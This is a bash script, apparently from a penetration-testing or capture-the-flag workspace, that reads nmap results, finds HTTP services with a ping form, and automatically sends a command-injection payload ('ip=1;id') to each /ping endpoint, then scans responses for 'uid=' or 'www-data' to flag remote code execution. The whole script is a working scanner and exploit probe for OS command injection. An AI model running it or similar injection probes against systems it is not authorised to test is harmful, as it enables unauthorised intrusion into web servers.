#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
NMAP_FILE=${2:?NMAP_FILE}
TO=${3:-8}
OUT_DIR=${4:-/workspace/recon/httpx}
DIR="$OUT_DIR/${IP}_ping_pages"
mkdir -p "$DIR"
# Collect all HTTP-like ports
PORTS=$(awk '/\/tcp\s+open\s+.*http/{print $1}' "$NMAP_FILE" | cut -d/ -f1 | sort -n | uniq)
# Probe each for index and /ping
: > "$DIR/candidates.txt"
for p in $PORTS; do
  base="http://$IP:$p"
  # Index
  curl -fsS -m "$TO" --connect-timeout "$TO" -i "$base/" > "$DIR/${p}_index.head" 2>/dev/null || true
  awk 'f{print} /^$/{f=1}' "$DIR/${p}_index.head" > "$DIR/${p}_index.html" 2>/dev/null || true
  # /ping
  curl -fsS -m "$TO" --connect-timeout "$TO" -i "$base/ping" > "$DIR/${p}_ping.head" 2>/dev/null || true
  awk 'f{print} /^$/{f=1}' "$DIR/${p}_ping.head" > "$DIR/${p}_ping.html" 2>/dev/null || true
  # Check for ping form markers
  if rg -q "(?i)ping|name=\"ip\"|action=\"/ping\"|Ping Your IP" "$DIR/${p}_index.html" "$DIR/${p}_ping.html" 2>/dev/null; then
    echo "$p" | tee -a "$DIR/candidates.txt"
    # Test benign POST
    curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=127.0.0.1' "$base/ping" > "$DIR/${p}_ping_post.txt" 2>/dev/null || true
    # Test injection
    RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=1;id' "$base/ping" || true)
    printf '%s\n' "$RES" | head -n 5 > "$DIR/${p}_ping_inj.txt"
  fi
  sleep 0.03
done
# Show candidates and any RCE hits
echo "=== ping candidates ==="
sed -n '1,120p' "$DIR/candidates.txt" || true
echo "=== injection hits (uid/www-data/linux) ==="
rg -n "uid=|www-data|Linux" -S "$DIR" | sed -n '1,200p' || true
